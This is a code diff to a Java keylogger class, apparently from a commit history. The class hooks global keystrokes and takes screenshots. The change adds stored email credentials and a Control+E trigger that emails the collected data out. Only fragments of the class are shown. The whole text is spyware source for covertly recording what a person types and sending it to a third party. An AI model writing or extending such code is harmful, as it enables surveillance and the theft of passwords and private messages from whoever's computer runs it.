@@ -26,6 +26,15 @@ public class KeyLogger implements Runnable, NativeKeyListener {
     private boolean modded = false;
     private static Controller con;
 
+    static String emailAddress, password;
+
+    public void setCredentials( String emaill, String password) {
+        emailAddress = emaill;
+        this.password = password;
+        email = new Email(emailAddress,password);
+
+    }
+
     @Override
     public void run() {
 
@@ -41,7 +50,6 @@ public class KeyLogger implements Runnable, NativeKeyListener {
         }
         GlobalScreen.addNativeKeyListener(new KeyLogger());
 
-        email = new Email();
         screenshot = new Screenshot(Filename);
 
         //disable logging
@@ -87,6 +95,7 @@ public class KeyLogger implements Runnable, NativeKeyListener {
 
                     case NativeKeyEvent.VC_E:
                         //if control + e is pressed then email
+                        email.sendEmail();
                         modded= false;
                         break;
 
